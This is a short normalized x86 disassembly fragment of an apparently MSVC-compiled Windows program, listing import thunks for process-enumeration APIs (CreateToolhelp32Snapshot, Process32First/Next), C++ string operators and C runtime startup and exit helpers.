jmp [ Process32Next@IAT ]
Process32First
jmp [ Process32First@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
sub_402112
push [ esp + 0x4 ]
call free
pop ecx
retn
??6std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@@Z
jmp [ std::operator<<@IAT ]
??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
jmp [ std::operator&@IAT ]
sub_40212a
cmp [ rw-data ] 0xffffffff
jne r-xdata
push rw-data
push rw-data
push [ esp + 0xc ]
call __dllonexit
add esp 0xc
retn
push [ esp + 0x4 ]
call [ _onexit@IAT ]
pop ecx
retn
sub_402156
push [ esp + 0x4 ]
call sub_40212a
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
free
jmp [ free@IAT ]
__dllonexit
jmp [ __dllonexit@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_4022de
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_4022f0
xor eax eax
retn
sub_4022f3
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
